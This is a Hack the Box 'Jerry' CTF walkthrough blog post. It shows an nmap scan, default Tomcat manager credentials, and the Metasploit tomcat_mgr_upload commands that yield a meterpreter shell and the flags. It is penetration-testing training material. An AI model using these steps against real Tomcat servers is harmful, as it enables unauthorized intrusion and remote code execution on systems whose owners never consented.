@@ -1,0 +1,208 @@
+
+								
+																		Hack the Box: Jerry Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on November 18, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello CTF Crackers!! Today we are going to capture the flag on a Challenge named as “Jerry” which is available online for those who want to increase their skill in penetration testing and black box testing. Jerry is a retired vulnerable lab presented by ‘Hack the Box’ for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to expert level.
+Level: Easy
+Flags: There are two flags. (user.txt &amp; root.txt)
+IP Address: 10.10.10.95 
+Penetrating Methodologies
+
+Port scanning and IP discovery
+Browsing the IP on port 8080
+Enumerating served webpage
+Getting Login Credentials
+Attacking using Metasploit
+Getting root Access
+Reading the flags
+
+Walkthrough
+Since these labs are available online via VPN therefore, they have a static IP Address. The IP Address of Jerry is 10.10.10.95
+Let’s start off with scanning the network to find our target
+
+		
+		
+			
+			
+			
+			
+nmap -sV 10.10.10.95
+			
+				
+					
+				
+					1
+				
+						nmap -sV 10.10.10.95
+					
+				
+			
+		
+
+
+So here, we notice very interesting result from nmap scan, it shows port 8080 is open for Apache Tomcat/ Coyote JSP Engine 1.1
+Next order of business is to browse the IP on a Web Browser.
+
+On opening the IP on the Web Browser, we are greeted with the default TomCat page. After some enumeration here and there, we found the “Manager App” Link. Upon clicking this link, we are struck with a Login Form as shown below.
+
+Here, after some tweaking with some passwords and other stuff, we found that clicking on “Cancel” Button triggers a 401 Error as shown in the image.
+
+After closely reading the example on the webpage provided, we got the Login Credentials.
+
+		
+		
+			
+			
+			
+			
+User: tomcat
+Password: s3cret
+			
+				
+					
+				
+					12
+				
+						User: tomcatPassword: s3cret
+					
+				
+			
+		
+
+Its time to attack, using the Swiss knife of any penetration tester – “Metasploit”.
+After doing some research and some tries, it was clear that we can use the tomcat_mgr_upload exploit.
+So, let’s do this:
+
+		
+		
+			
+			
+			
+			
+msf&gt; use exploit/multi/http/tomcat_mgr_upload
+msf exploit(multi/http/tomcat_mgr_upload) &gt; set rhost 10.10.10.95
+msf exploit(multi/http/tomcat_mgr_upload) &gt; set rport 8080
+msf exploit(multi/http/tomcat_mgr_upload) &gt; set HttpUsername tomcat
+msf exploit(multi/http/tomcat_mgr_upload) &gt; set HttpPassword s3cret
+msf exploit(multi/http/tomcat_mgr_upload) &gt; exploit
+			
+				
+					
+				
+					123456
+				
+						msf&gt; use exploit/multi/http/tomcat_mgr_uploadmsf exploit(multi/http/tomcat_mgr_upload) &gt; set rhost 10.10.10.95msf exploit(multi/http/tomcat_mgr_upload) &gt; set rport 8080msf exploit(multi/http/tomcat_mgr_upload) &gt; set HttpUsername tomcatmsf exploit(multi/http/tomcat_mgr_upload) &gt; set HttpPassword s3cretmsf exploit(multi/http/tomcat_mgr_upload) &gt; exploit
+					
+				
+			
+		
+
+As shown in the image provided below, the exploit runs successfully and gives a meterpreter session with elevated privileges.
+We traverse through the Directories to get flag using commands like “ls” and “cd”
+
+After a little bit of enumeration, we get to the C:\Users directory. Here we come across the Administrator directory so we traverse to that directory. And the further we traverse to the Desktop directory.
+This gives us the flags directory, which on opening gives us a text file named 2 for the price of 1. On opening, we get both the user and the root password.
+
+Author: Pavandeep Singh is a Technical Writer, Researcher and Penetration Tester Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Ravi November 19, 2018 at 4:51 pm							
+							
+							
+														
+							
+								Nice
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
